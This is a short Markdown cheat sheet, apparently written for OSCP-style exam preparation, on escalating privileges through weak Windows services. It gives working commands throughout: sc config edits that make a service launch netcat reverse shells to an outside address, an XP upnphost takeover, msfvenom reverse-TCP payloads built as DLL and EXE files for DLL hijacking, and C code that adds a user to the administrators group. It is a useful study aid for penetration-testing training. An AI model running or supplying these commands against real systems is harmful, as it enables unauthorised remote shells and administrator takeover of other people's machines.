# Weak Services

## Abuse service via BinPath

Search for a services which are running under priviliaged account, then use the following command with accesschk.exe to verify if our current user has permission to modify its settings:

```
C:\> accesschk.exe -wuvc myservice
```

Look for the “SERVICE_CHANGE_CONFIG” in the response. Then use the following command to execute net user instend of service bin:

```
C:\> sc config myservice binpath= "C:\Inetpub\wwwroot\nc.exe 192.168.10.11 1234 -e C:\WINDOWS\System32\cmd.exe"
```

## Abuse service via Unquoted Paths

For more detailed technique: https://github.com/RootInj3c/OSCP-PwK/blob/master/Windows/Unquoted_Paths.md


## Abuse Upnp service (only for Windows XP SP1)

In Windows XP SP1 the upnp service is vulnerable to misconfigured permissions allow to esclate to Administrator. Run the following commands:

```
C:/> sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe YOUR_IP 1234 -e C:\WINDOWS\System32\cmd.exe"
C:/> sc config upnphost obj= ".\LocalSystem" password= ""
C:/> sc config upnphost depend= ""
C:/> sc qc upnphost
```

Restrat the service by reboot the machine to get Administrator shell.

## DLL Hijacking

If we found a program which try to load not found DLL libary we could use the following command to create our malicous DLL and put it instend:

```
root@kali:~/# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.10.11 LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f dll > malicous_dll.exe
```

*NOTE*: To detect vulnerable programm you'll need to use Process Monitor. Download from here: https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer?redirectedfrom=MSDN

## Appendix - Creating malicous services

### Manully using C

Using the following code:

```
#include <stdlib.h>
int main ()
{
    int i;
    i = system("net localgroup administrators theusername /add");
    return 0;
}
```

Compile it using Kali:

```
root@kali:~/# nano adduser.c
root@kali:~/# i686-w64-mingw32-gcc adduser.c -lws2_32 -o exp.exe
```

### Using Metasploit

Execute the following command to get pre-compiled malicous binary:

```
root@kali:~/# msfvenom -p windows/shell/reverse_tcp LHOST=192.168.10.11 LPORT=443 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > example.exe
```



